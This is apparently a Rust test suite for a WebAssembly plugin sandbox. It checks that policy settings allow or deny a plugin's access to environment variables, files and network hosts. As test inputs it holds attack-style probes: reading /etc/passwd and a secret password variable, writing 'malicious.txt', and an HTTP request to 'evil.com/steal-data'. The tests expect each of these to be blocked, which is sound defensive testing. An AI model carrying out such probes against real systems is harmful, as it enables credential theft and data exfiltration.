use anyhow::Result;
use cpex_wasm_host::policy_loader::{
    build_wasi_context, PolicyHttpHooks, SandboxConfig, PolicyConfig, FilesystemRule,
};
use std::sync::Arc;
use wasmtime::component::{Component, Linker};
use wasmtime::{Config, Engine, Store};
use wasmtime_wasi::{WasiCtx, WasiCtxView, WasiView};
use wasmtime_wasi_http::p2::WasiHttpHooks;
use wasmtime_wasi_http::p2::types::OutgoingRequestConfig;

wasmtime::component::bindgen!({
    path: "wit/world.wit",
    world: "plugin",
    exports: { default: async },
});

struct TestHostState {
    wasi: WasiCtx,
    table: wasmtime::component::ResourceTable,
}

impl WasiView for TestHostState {
    fn ctx(&mut self) -> WasiCtxView<'_> {
        WasiCtxView {
            ctx: &mut self.wasi,
            table: &mut self.table,
        }
    }
}

fn create_engine() -> Result<Engine> {
    let mut config = Config::new();
    config.wasm_component_model(true);
    Ok(Engine::new(&config)?)
}

fn make_probe_payload(probe: serde_json::Value) -> cpex::plugin::types::MessagePayload {
    cpex::plugin::types::MessagePayload {
        data: serde_json::json!({
            "message": {
                "role": "user",
                "content": [{"type": "text", "text": "sandbox probe"}],
                "tool_calls": [{
                    "id": "probe_1",
                    "name": "sandbox_probe",
                    "arguments": "{}"
                }]
            },
            "probe": probe
        }).to_string(),
    }
}

fn parse_probe_result(result: &cpex::plugin::types::PluginResult) -> serde_json::Value {
    match result {
        cpex::plugin::types::PluginResult::Deny(msg) => {
            if let Some(json_str) = msg.strip_prefix("SANDBOX_PROBE_RESULT:") {
                serde_json::from_str(json_str).unwrap_or(serde_json::Value::Null)
            } else {
                serde_json::Value::Null
            }
        }
        _ => serde_json::Value::Null,
    }
}

// ============================================================
// ENV VAR TESTS
// ============================================================

#[tokio::test]
async fn test_allowed_env_var_is_visible() -> Result<()> {
    std::env::set_var("PLUGIN_API_KEY", "test-allowed-value");

    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec!["PLUGIN_API_KEY".to_string()],
            allowed_filesystem: vec![],
            allowed_network: vec![],
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let payload = make_probe_payload(serde_json::json!({
        "env_vars": ["PLUGIN_API_KEY"]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    assert_eq!(report["env"]["PLUGIN_API_KEY"]["found"], true);
    assert_eq!(report["env"]["PLUGIN_API_KEY"]["value"], "test-allowed-value");
    Ok(())
}

#[tokio::test]
async fn test_disallowed_env_var_is_denied() -> Result<()> {
    std::env::set_var("SECRET_DB_PASSWORD", "super-secret");

    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec!["PLUGIN_API_KEY".to_string()],
            allowed_filesystem: vec![],
            allowed_network: vec![],
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let payload = make_probe_payload(serde_json::json!({
        "env_vars": ["SECRET_DB_PASSWORD", "HOME", "PATH"]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    assert_eq!(report["env"]["SECRET_DB_PASSWORD"]["found"], false);
    assert_eq!(report["env"]["HOME"]["found"], false);
    assert_eq!(report["env"]["PATH"]["found"], false);
    Ok(())
}

// ============================================================
// FILESYSTEM TESTS
// ============================================================

#[tokio::test]
async fn test_allowed_filesystem_read_succeeds() -> Result<()> {
    // Create a temp dir with a test file
    let tmp = std::env::temp_dir().join("cpex-test-sandbox-allowed");
    std::fs::create_dir_all(&tmp)?;
    std::fs::write(tmp.join("hello.txt"), "sandbox-test-content")?;

    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec![],
            allowed_filesystem: vec![FilesystemRule {
                dir: Some(tmp.to_string_lossy().to_string()),
                file: None,
                permission: "read".to_string(),
            }],
            allowed_network: vec![],
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let read_path = tmp.join("hello.txt").to_string_lossy().to_string();
    let payload = make_probe_payload(serde_json::json!({
        "read_files": [read_path]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    assert_eq!(report["fs"][&read_path]["accessible"], true);

    // Cleanup
    std::fs::remove_dir_all(&tmp)?;
    Ok(())
}

#[tokio::test]
async fn test_disallowed_filesystem_read_is_denied() -> Result<()> {
    // Create a temp dir that is NOT in the allowed list
    let allowed_tmp = std::env::temp_dir().join("cpex-test-sandbox-allowed2");
    std::fs::create_dir_all(&allowed_tmp)?;

    let forbidden_tmp = std::env::temp_dir().join("cpex-test-sandbox-forbidden");
    std::fs::create_dir_all(&forbidden_tmp)?;
    std::fs::write(forbidden_tmp.join("secret.txt"), "top-secret-data")?;

    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec![],
            allowed_filesystem: vec![FilesystemRule {
                dir: Some(allowed_tmp.to_string_lossy().to_string()),
                file: None,
                permission: "read".to_string(),
            }],
            allowed_network: vec![],
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let forbidden_path = forbidden_tmp.join("secret.txt").to_string_lossy().to_string();
    let payload = make_probe_payload(serde_json::json!({
        "read_files": [forbidden_path, "/etc/passwd"]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    assert_eq!(report["fs"][&forbidden_path]["accessible"], false);
    assert_eq!(report["fs"]["/etc/passwd"]["accessible"], false);

    // Cleanup
    std::fs::remove_dir_all(&allowed_tmp)?;
    std::fs::remove_dir_all(&forbidden_tmp)?;
    Ok(())
}

#[tokio::test]
async fn test_write_to_readonly_dir_is_denied() -> Result<()> {
    let tmp = std::env::temp_dir().join("cpex-test-sandbox-readonly");
    std::fs::create_dir_all(&tmp)?;

    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec![],
            allowed_filesystem: vec![FilesystemRule {
                dir: Some(tmp.to_string_lossy().to_string()),
                file: None,
                permission: "read".to_string(),
            }],
            allowed_network: vec![],
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let write_path = tmp.join("malicious.txt").to_string_lossy().to_string();
    let payload = make_probe_payload(serde_json::json!({
        "write_files": [write_path]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    let key = format!("write:{}", write_path);
    assert_eq!(report["fs"][&key]["accessible"], false);

    // Cleanup
    std::fs::remove_dir_all(&tmp)?;
    Ok(())
}

// ============================================================
// NETWORK TESTS (in-plugin via wasi:sockets)
// ============================================================

#[tokio::test]
async fn test_network_denied_when_no_allowed_hosts() -> Result<()> {
    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec![],
            allowed_filesystem: vec![],
            allowed_network: vec![], // empty = no network access
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let payload = make_probe_payload(serde_json::json!({
        "tcp_connect": ["httpbin.org:80"]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    assert_eq!(report["net"]["httpbin.org:80"]["accessible"], false);
    Ok(())
}

#[tokio::test]
async fn test_network_allowed_when_host_in_policy() -> Result<()> {
    let sandbox = SandboxConfig {
        version: "wasm-p2".to_string(),
        policy: PolicyConfig {
            allowed_env: vec![],
            allowed_filesystem: vec![],
            allowed_network: vec!["httpbin.org".to_string()],
        },
    };

    let ctx = build_wasi_context(&sandbox)?;
    let engine = create_engine()?;

    let mut store = Store::new(&engine, TestHostState {
        wasi: ctx.wasi_ctx,
        table: wasmtime::component::ResourceTable::new(),
    });

    let mut linker = Linker::new(&engine);
    wasmtime_wasi::p2::add_to_linker_async(&mut linker)?;

    let component = Component::from_file(&engine, "plugin.wasm")?;
    let plugin = Plugin::instantiate_async(&mut store, &component, &linker).await?;

    let payload = make_probe_payload(serde_json::json!({
        "tcp_connect": ["httpbin.org:80"]
    }));
    let extensions = cpex::plugin::types::Extensions { security: None, http: None };

    let result = plugin.call_handle_hook(&mut store, &payload, &extensions).await?;
    let report = parse_probe_result(&result);

    // Should succeed — httpbin.org is in allowed_network and socket access is enabled
    assert_eq!(report["net"]["httpbin.org:80"]["accessible"], true);
    Ok(())
}

// ============================================================
// NETWORK TESTS (PolicyHttpHooks — host-level wasi:http gating)
// ============================================================

#[test]
fn test_http_hooks_allowed_host_is_permitted() {
    let mut hooks = PolicyHttpHooks {
        allowed_hosts: Arc::new(vec!["httpbin.org".to_string(), "api.example.com".to_string()]),
    };

    let config = OutgoingRequestConfig {
        use_tls: false,
        connect_timeout: std::time::Duration::from_secs(5),
        first_byte_timeout: std::time::Duration::from_secs(5),
        between_bytes_timeout: std::time::Duration::from_secs(5),
    };

    let request = hyper::Request::builder()
        .uri("http://httpbin.org/get")
        .body(wasmtime_wasi_http::p2::body::HyperOutgoingBody::default())
        .unwrap();

    assert!(hooks.send_request(request, config).is_ok());
}

#[test]
fn test_http_hooks_disallowed_host_is_denied() {
    let mut hooks = PolicyHttpHooks {
        allowed_hosts: Arc::new(vec!["httpbin.org".to_string()]),
    };

    let config = OutgoingRequestConfig {
        use_tls: false,
        connect_timeout: std::time::Duration::from_secs(5),
        first_byte_timeout: std::time::Duration::from_secs(5),
        between_bytes_timeout: std::time::Duration::from_secs(5),
    };

    let request = hyper::Request::builder()
        .uri("http://evil.com/steal-data")
        .body(wasmtime_wasi_http::p2::body::HyperOutgoingBody::default())
        .unwrap();

    let result = hooks.send_request(request, config);
    assert!(result.is_err());
}

#[test]
fn test_http_hooks_subdomain_of_allowed_host_is_permitted() {
    let mut hooks = PolicyHttpHooks {
        allowed_hosts: Arc::new(vec!["example.com".to_string()]),
    };

    let config = OutgoingRequestConfig {
        use_tls: false,
        connect_timeout: std::time::Duration::from_secs(5),
        first_byte_timeout: std::time::Duration::from_secs(5),
        between_bytes_timeout: std::time::Duration::from_secs(5),
    };

    let request = hyper::Request::builder()
        .uri("http://api.example.com/data")
        .body(wasmtime_wasi_http::p2::body::HyperOutgoingBody::default())
        .unwrap();

    assert!(hooks.send_request(request, config).is_ok());
}

#[test]
fn test_http_hooks_empty_allowed_hosts_denies_all() {
    let mut hooks = PolicyHttpHooks {
        allowed_hosts: Arc::new(vec![]),
    };

    let config = OutgoingRequestConfig {
        use_tls: false,
        connect_timeout: std::time::Duration::from_secs(5),
        first_byte_timeout: std::time::Duration::from_secs(5),
        between_bytes_timeout: std::time::Duration::from_secs(5),
    };

    let request = hyper::Request::builder()
        .uri("http://anything.com/path")
        .body(wasmtime_wasi_http::p2::body::HyperOutgoingBody::default())
        .unwrap();

    assert!(hooks.send_request(request, config).is_err());
}
